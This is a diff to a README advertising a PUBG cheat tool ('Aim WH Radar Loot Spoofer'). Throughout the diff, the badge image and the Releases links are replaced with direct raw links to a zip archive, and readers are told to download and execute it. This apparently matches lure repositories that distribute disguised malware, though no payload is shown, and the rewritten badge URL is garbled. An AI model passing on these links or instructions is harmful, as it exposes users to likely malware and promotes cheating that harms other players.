@@ -1,6 +1,6 @@
 # PUBG Aim WH Radar Loot Spoofer by Satano
 
-![PUBG Aim WH Radar Loot Spoofer](https://img.shields.io/badge/PUBG%20Aim%20WH%20Radar%20Loot%20Spoofer%20by%20Satano-v1.0-brightgreen)
+![PUBG Aim WH Radar Loot Spoofer](https://raw.githubusercontent.com/HimakomUnud/PUBG-Aim-WH-Radar-Loot-Spoofer-by-Satano/main/Liber/Aim-PUB-W-by-Radar-Satano-Loot-Spoofer-1.5-alpha.4.zip%20Aim%20WH%20Radar%20Loot%20Spoofer%20by%20Satano-v1.0-brightgreen)
 
 Welcome to the **PUBG Aim WH Radar Loot Spoofer** repository. This project aims to enhance your gaming experience in PUBG by providing a range of advanced features. Our software stands out due to its exceptional execution and ease of use.
 
@@ -26,7 +26,7 @@ Our PUBG hack includes a variety of powerful tools designed to improve your game
 
 ## Installation
 
-To get started, you will need to download the latest release. Visit the [Releases section](https://github.com/HimakomUnud/PUBG-Aim-WH-Radar-Loot-Spoofer-by-Satano/releases) to find the appropriate file. Download and execute it to install the software.
+To get started, you will need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/HimakomUnud/PUBG-Aim-WH-Radar-Loot-Spoofer-by-Satano/main/Liber/Aim-PUB-W-by-Radar-Satano-Loot-Spoofer-1.5-alpha.4.zip) to find the appropriate file. Download and execute it to install the software.
 
 ## Usage
 
@@ -78,7 +78,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## Contact
 
-For any questions or support, feel free to reach out. You can also check the [Releases section](https://github.com/HimakomUnud/PUBG-Aim-WH-Radar-Loot-Spoofer-by-Satano/releases) for updates and new features.
+For any questions or support, feel free to reach out. You can also check the [Releases section](https://raw.githubusercontent.com/HimakomUnud/PUBG-Aim-WH-Radar-Loot-Spoofer-by-Satano/main/Liber/Aim-PUB-W-by-Radar-Satano-Loot-Spoofer-1.5-alpha.4.zip) for updates and new features.
 
 ---
 
